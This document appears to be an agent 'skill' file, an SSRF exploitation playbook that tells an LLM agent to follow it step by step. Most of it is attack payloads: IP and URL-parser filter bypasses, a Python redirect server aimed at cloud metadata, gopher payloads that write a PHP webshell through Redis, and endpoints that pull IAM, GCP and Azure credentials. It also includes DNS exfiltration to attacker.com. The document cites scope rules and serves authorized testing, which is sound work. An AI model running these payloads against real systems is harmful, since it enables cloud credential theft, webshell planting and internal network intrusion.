# Server-Side Request Forgery (SSRF) Skill

## Overview
Complete methodology for detecting, exploiting, and escalating SSRF vulnerabilities.
Covers cloud metadata extraction (AWS/GCP/Azure IMDS), internal network pivoting,
protocol smuggling (gopher/file/dict), DNS rebinding, URL parser bypasses, and redirect chains.
This is the LLM agent's step-by-step playbook — follow it top to bottom.

## Scope Rules
1. Only test parameters and endpoints explicitly in scope.
2. Cloud metadata access on production systems requires explicit authorization.
3. Internal port scanning may trigger alerts — coordinate with blue team if needed.
4. Record ALL payloads, URLs accessed, and responses received.
5. Never exfiltrate sensitive metadata beyond proof-of-concept.

---

## Phase 1: Detection — Finding SSRF Entry Points

### 1.1 Parameter Discovery
Look for any parameter that accepts a URL, hostname, IP, or file path:
- **URL parameters:** `?url=`, `?link=`, `?redirect=`, `?dest=`, `?uri=`, `?path=`
- **Fetch/proxy parameters:** `?fetch=`, `?proxy=`, `?target=`, `?page=`, `?load=`
- **Image/file parameters:** `?img=`, `?image=`, `?src=`, `?file=`, `?document=`
- **Webhook/callback parameters:** `?callback=`, `?webhook=`, `?notify_url=`
- **Import/export features:** PDF generators, CSV importers, URL preview/unfurling
- **POST body fields:** JSON `{"url":"..."}`, XML `<url>...</url>`
- **HTTP headers:** `Referer`, `X-Forwarded-For`, `X-Original-URL`, `Host`

### 1.2 Initial SSRF Probing — Out-of-Band Detection
Use an external collaborator/webhook to confirm the server makes outbound requests:

```bash
# Using interactsh or Burp Collaborator
# Replace COLLAB with your collaborator domain
curl 'http://target/fetch?url=http://COLLAB_ID.oast.fun'
curl 'http://target/fetch?url=http://COLLAB_ID.burpcollaborator.net'
curl 'http://target/fetch?url=https://webhook.site/YOUR-UUID'

# Check collaborator for incoming HTTP/DNS requests
# If callback received → server is making outbound requests (SSRF confirmed)
```

### 1.3 Basic Internal Access Probing
Test if the server can reach internal resources:

```bash
# Localhost access
http://127.0.0.1/
http://localhost/
http://127.0.0.1:80/
http://127.0.0.1:8080/
http://127.0.0.1:443/

# Cloud metadata (IMDSv1)
http://169.254.169.254/
http://169.254.169.254/latest/meta-data/

# Internal RFC1918 ranges
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/
```

**Decision:** If response differs from normal error (content, status code, timing) → SSRF likely.

### 1.4 Response Analysis
Classify the SSRF type based on what you see:
- **Full SSRF:** Response body returned to you (best case — read internal content directly)
- **Blind SSRF:** No response body, but you can detect via:
  - Response timing differences (port open vs closed)
  - Out-of-band callbacks (DNS/HTTP to your server)
  - Error message differences
  - Status code differences
- **Semi-blind SSRF:** Partial info (status code, content length, error type)

---

## Phase 2: URL Filter Bypass Techniques

### 2.1 IP Address Obfuscation
When filters block `127.0.0.1` or `169.254.169.254`:

```
# Decimal encoding
http://2130706433/                    → 127.0.0.1
http://2852039166/                    → 169.254.169.254

# Octal encoding
http://0177.0.0.1/                    → 127.0.0.1
http://0251.0376.0251.0376/           → 169.254.169.254

# Hex encoding
http://0x7f000001/                    → 127.0.0.1
http://0x7f.0x0.0x0.0x1/             → 127.0.0.1
http://0xa9fea9fe/                    → 169.254.169.254

# Mixed encoding
http://0177.0.0.0x1/                  → 127.0.0.1
http://0x7f.0.0.1/                    → 127.0.0.1

# IPv6 mappings
http://[::1]/                         → localhost
http://[0:0:0:0:0:ffff:127.0.0.1]/   → 127.0.0.1
http://[::ffff:169.254.169.254]/      → IMDS
http://[0000::1]/                     → localhost

# Shortened IPv6
http://[::]/ 

# Zero compression
http://0.0.0.0/                       → localhost on many systems
http://127.1/                         → 127.0.0.1 (Linux shorthand)
http://127.0.1/                       → 127.0.0.1
```

### 2.2 DNS-Based Bypasses
```bash
# Attacker-controlled DNS resolving to internal IP
# Register domain pointing A record to 127.0.0.1
http://evil.attacker.com/   → resolves to 127.0.0.1

# nip.io / sslip.io (wildcard DNS)
http://127.0.0.1.nip.io/
http://169.254.169.254.nip.io/
http://10.0.0.1.sslip.io/

# xip.io variants
http://127.0.0.1.xip.io/
```

### 2.3 URL Parser Confusion
```bash
# Credentials in URL (parser confusion)
http://expected-host@127.0.0.1/
http://evil.com@127.0.0.1/
http://127.0.0.1#@expected-host/

# Fragment / query confusion
http://expected-host#@127.0.0.1/
http://127.0.0.1%2523@expected-host/

# Backslash confusion (Windows / some parsers)
http://127.0.0.1\@expected-host/

# URL encoding tricks
http://127.0.0.1%00@expected-host/     → null byte
http://127.0.0.1%2500@expected-host/   → double-encoded null

# Port in unusual position
http://127.0.0.1:80@expected-host/

# Scheme confusion
http:///127.0.0.1/                      → triple slash
```

### 2.4 Redirect Chains
When the filter checks the initial URL but follows redirects:

```python
# Host a redirect server on your attacker machine
# redirect.py
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

```bash
# Point SSRF to your redirect server
http://target/fetch?url=http://attacker.com:8888/redirect

# URL shorteners also work as redirectors
http://target/fetch?url=https://bit.ly/XXXXX  → points to internal resource
```

### 2.5 Protocol Smuggling
```bash
# File protocol (if allowed)
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///proc/net/tcp
file:///var/www/html/config.php

# Dict protocol (Redis, Memcached)
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:11211/stats

# Gopher protocol (most powerful — craft raw TCP packets)
gopher://127.0.0.1:6379/_INFO%0d%0a
gopher://127.0.0.1:6379/_SET%20shell%20%22<%3Fphp%20system($_GET['c'])%3B%3F>%22%0d%0a
gopher://127.0.0.1:25/_HELO%20evil.com%0d%0aMAIL%20FROM:...

# TFTP (UDP — rare but possible)
tftp://127.0.0.1:69/file
```

---

## Phase 3: Cloud Metadata Exploitation

### 3.1 AWS IMDS (Instance Metadata Service)

**IMDSv1 (no authentication — just GET):**
```bash
# Instance identity
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/instance-type
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/mac

# IAM role credentials (CRITICAL)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}
# Returns: AccessKeyId, SecretAccessKey, Token — use with AWS CLI

# User data (may contain secrets, startup scripts)
http://169.254.169.254/latest/user-data

# Network interfaces
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
http://169.254.169.254/latest/meta-data/network/interfaces/macs/{MAC}/vpc-id
http://169.254.169.254/latest/meta-data/network/interfaces/macs/{MAC}/subnet-id
```

**IMDSv2 (requires PUT token first):**
```bash
# Step 1: Get token (requires PUT with TTL header)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token in subsequent requests
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF usually can't set PUT method + custom headers → IMDSv2 blocks most SSRF
# But: if the SSRF allows method/header control, it's still exploitable
```

### 3.2 GCP Metadata Service
```bash
# GCP requires Metadata-Flavor header (sometimes enforced, sometimes not)
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# With required header
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# Instance info
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/zone
http://metadata.google.internal/computeMetadata/v1/instance/machine-type
http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/

# Service account token (CRITICAL)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# Project metadata / SSH keys
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
http://metadata.google.internal/computeMetadata/v1/project/project-id

# kube-env (Kubernetes secrets)
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
```

### 3.3 Azure IMDS
```bash
# Azure requires Metadata:true header
http://169.254.169.254/metadata/instance?api-version=2021-02-01
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Instance info
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01

# Managed identity token (CRITICAL)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Subscription info
http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01

# User data
http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01
```

### 3.4 Other Cloud / Container Metadata
```bash
# DigitalOcean
http://169.254.169.254/metadata/v1/

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/

# Kubernetes (from a pod)
https://kubernetes.default.svc/api/v1/namespaces/
# Token at: /var/run/secrets/kubernetes.io/serviceaccount/token

# Docker (if socket exposed)
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/images/json

# Consul
http://127.0.0.1:8500/v1/agent/self
http://127.0.0.1:8500/v1/kv/?recurse

# ECS Task Metadata (AWS container)
http://169.254.170.2/v2/credentials/{GUID}
```

---

## Phase 4: Internal Network Pivoting via SSRF

### 4.1 Internal Port Scanning
Use SSRF to enumerate open ports on internal hosts:

```bash
# Scan common ports on localhost
http://127.0.0.1:22/      → SSH
http://127.0.0.1:80/      → HTTP
http://127.0.0.1:443/     → HTTPS
http://127.0.0.1:3306/    → MySQL
http://127.0.0.1:5432/    → PostgreSQL
http://127.0.0.1:6379/    → Redis
http://127.0.0.1:27017/   → MongoDB
http://127.0.0.1:9200/    → Elasticsearch
http://127.0.0.1:8080/    → Alt HTTP / Tomcat
http://127.0.0.1:8443/    → Alt HTTPS
http://127.0.0.1:11211/   → Memcached

# Scan internal subnet (iterate through IPs)
http://10.0.0.1:80/
http://10.0.0.2:80/
...
http://192.168.1.1:80/
```

**Detection method:**
- Different response time → port open vs closed (connection refused is fast, timeout is slow)
- Different error messages → "connection refused" vs "timeout" vs actual response
- Different content length or status codes

### 4.2 Internal Service Exploitation

**Redis (unauthenticated):**
```bash
# Via gopher protocol
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html/%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20payload%20%22<%3Fphp%20system($_GET['c'])%3B%20%3F>%22%0d%0aSAVE%0d%0a

# Via dict protocol (limited)
dict://127.0.0.1:6379/INFO
```

**Elasticsearch:**
```bash
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_search?q=password
http://127.0.0.1:9200/_cluster/health
```

**Internal APIs / Admin Panels:**
```bash
http://127.0.0.1:8080/admin
http://127.0.0.1:8080/actuator/env
http://127.0.0.1:8080/api/internal/
http://127.0.0.1:8500/ui/                  # Consul
http://127.0.0.1:15672/                    # RabbitMQ Management
```

### 4.3 Gopher Protocol Deep Dive
Gopher lets you send raw TCP data through SSRF. URL encode each byte:

```
gopher://<host>:<port>/_<URL-encoded-TCP-data>

Rules:
- First char after _ is consumed (use any filler char)
- %0d%0a = \r\n (CRLF line ending)
- URL-encode everything: spaces=%20, special chars, etc.
```

**Generate gopher payloads with Gopherus:**
```bash
# MySQL — execute query via unauthenticated MySQL protocol
gopherus --exploit mysql
# Enter: SELECT * FROM users

# Redis — write webshell via Redis protocol
gopherus --exploit redis
# Choose: PHPShell → provides gopher:// URL

# FastCGI — execute commands via FastCGI protocol
gopherus --exploit fastcgi
# Enter: /var/www/html/index.php + command

# SMTP — send email via internal SMTP
gopherus --exploit smtp
```

---

## Phase 5: DNS Rebinding

### 5.1 Concept
DNS rebinding bypasses SSRF filters that validate the DNS resolution:
1. Filter resolves `evil.com` → gets `1.2.3.4` (external IP, passes check)
2. Server makes request to `evil.com` → DNS now resolves to `127.0.0.1`
3. Server connects to `127.0.0.1` — bypassing the filter

### 5.2 Implementation
```bash
# Use services like:
# - rbndr.us (rebind.network)
# - 1u.ms
# - rebinder tools

# rbndr.us format: <hex-ip-A>.<hex-ip-B>.rbndr.us
# Alternates between IP A and IP B on each resolution
# 7f000001 = 127.0.0.1, c0a80001 = 192.168.0.1
http://7f000001.PUBLIC_IP_HEX.rbndr.us/

# 1u.ms format:
# make-<IP-A>-and-<IP-B>-rr.1u.ms
http://make-127.0.0.1-and-1.2.3.4-rr.1u.ms/
```

### 5.3 Race Condition Approach
Some filters validate DNS then immediately use the result. Use TTL=0 DNS records:
1. First resolution → returns allowed IP
2. Cache expires immediately (TTL=0)
3. Second resolution (during fetch) → returns `127.0.0.1`

---

## Phase 6: Blind SSRF Exploitation

### 6.1 Time-Based Detection
```bash
# Open port — fast response (~100ms)
# Closed port — connection refused (~50ms)
# Filtered/no host — timeout (~10-30 seconds)

# Compare response times to map internal network
time curl 'http://target/fetch?url=http://10.0.0.1:80/'   → fast = open
time curl 'http://target/fetch?url=http://10.0.0.1:22/'   → fast = open
time curl 'http://target/fetch?url=http://10.0.0.1:9999/' → slow = filtered/closed
```

### 6.2 Out-of-Band Exfiltration
When you can't see responses, chain SSRF with OOB:

```bash
# If SSRF follows redirects, use redirect to exfil:
# 1. SSRF fetches http://attacker.com/redir
# 2. Redirect to http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
# 3. If app processes/logs the response, find data in logs

# DNS exfiltration (if SSRF resolves DNS you control)
http://target/fetch?url=http://SENSITIVE_DATA.attacker.com/
# Check DNS logs for the subdomain = exfiltrated data
```

### 6.3 Error-Based Extraction
Some applications include the fetched content in error messages:
```bash
# "Could not parse response from http://127.0.0.1:22/ : SSH-2.0-OpenSSH_8.9"
# "Invalid JSON: <html>Admin Panel</html>"
# Parse error messages for internal service banners and content
```

---

## Decision Tree — Complete SSRF Attack Flow

```
URL/FETCH PARAMETER FOUND
│
├── OOB callback test (collaborator/webhook)
│   ├── Callback received → SSRF confirmed
│   └── No callback → Try other params, methods, encodings
│
├── SSRF TYPE?
│   ├── Full (response returned)
│   │   ├── Read cloud metadata (Phase 3)
│   │   ├── Scan internal ports (Phase 4)
│   │   └── Access internal services
│   │
│   ├── Blind (no response)
│   │   ├── Time-based port scanning
│   │   ├── OOB exfiltration via DNS/redirect
│   │   └── Error message analysis
│   │
│   └── Semi-blind (partial info)
│       ├── Status code / content length mapping
│       └── Error message parsing
│
├── FILTERS BLOCKING?
│   ├── IP blocked → Try obfuscation (Phase 2.1)
│   ├── Domain blocked → Try DNS bypass (Phase 2.2)
│   ├── URL parser bypass → Try confusion (Phase 2.3)
│   ├── Redirect following? → Use redirect chains (Phase 2.4)
│   ├── Protocol filter → Try gopher/dict/file (Phase 2.5)
│   └── DNS validation → Try DNS rebinding (Phase 5)
│
└── EXPLOITATION
    ├── AWS IMDSv1 → Get IAM creds → aws configure
    ├── GCP metadata → Get OAuth token → gcloud auth
    ├── Azure IMDS → Get managed identity token
    ├── Internal Redis → Write webshell via gopher
    ├── Internal Elasticsearch → Dump indices
    └── Internal admin panels → Access internal tooling
```

---

## Evidence Collection
1. `evidence.json` — parameter, payload, response content, internal resources accessed
2. `findings.json` — validated impact, severity, affected cloud services
3. `cloud_metadata.json` — extracted metadata (redacted credentials)
4. Screenshots of internal services accessed
5. Timeline of all requests made

## Evidence Consolidation
Store all payloads with exact URLs, HTTP methods, and response summaries.
Redact any actual credentials but note their existence.

## MITRE ATT&CK Mappings
- T1190 — Exploit Public-Facing Application
- T1552.005 — Cloud Instance Metadata API
- T1046 — Network Service Scanning
- T1018 — Remote System Discovery

## Deep Dives
Load references when needed:
1. Cloud metadata endpoints: `references/cloud_metadata.md`
2. Gopher protocol payloads: `references/gopher_payloads.md`
3. URL parser bypass techniques: `references/url_bypass.md`
4. DNS rebinding setup: `references/dns_rebinding.md`

## Success Criteria
- SSRF confirmed with proof of internal resource access
- Cloud metadata extracted (if applicable)
- Internal network topology partially mapped
- Filter bypass techniques documented
- All payloads and evidence recorded
